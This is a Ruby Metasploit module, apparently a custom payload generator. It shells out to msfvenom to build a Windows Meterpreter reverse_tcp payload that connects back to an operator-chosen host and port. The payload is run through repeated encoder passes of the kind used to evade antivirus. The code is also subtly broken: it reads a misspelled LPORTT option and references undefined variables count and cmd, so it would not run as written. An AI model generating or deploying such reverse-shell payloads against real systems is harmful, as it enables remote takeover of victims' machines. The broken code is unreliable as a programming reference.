#!/usr/bin/env ruby

class MetasploitModule < Msf::Payload

  Rank = NormalRanking

    def initialize(info = {})
        super(update_info(info,
        'Name'     => 'Custom Payload Generator',
        'Description' => %q{
            Create a custom payload generator that produces a payload
            tailored to specific requirements.
        },
        'Author'   => [ 'Emma LATEYRON' ],
        'License'  => MSF_LICENSE))

        register_options(
            [
                OptString.new('LHOST', [true, 'Local host']),
                OptInt.new('LPORT', [true, 'Local port']),
                OptString.new('ENCODER', [true, 'Encoder to use']),
                OptInt.new('ENCODERCOUNT', [true, 'Number of encoding iterations']),
                OptString.new('FORMAT', [true, 'Output format'])
            ]
        )
    end
      
    def run
        lhost = datastore['LHOST']
        lport = datastore['LPORTT']
        encoder = datastore['ENCODER']
        encoder_count = datastore['ENCODERCOUNT']
        format = datastore['FORMAT']

        print_status("Generating payload with encoding: #{encoder}")

        command = "msfvenom -p windows/meterpreter/reverse_tcp LHOST=#{lhost} LPORT=#{lport} -e #{encoder} -i #{count} -f #{format}"
        payload = `#{cmd}`

        if payload.empty?
            print_error("Failed to generate payload")
        else
            print_good("Generated encoded payload: #{payload}")
        end
    end
end
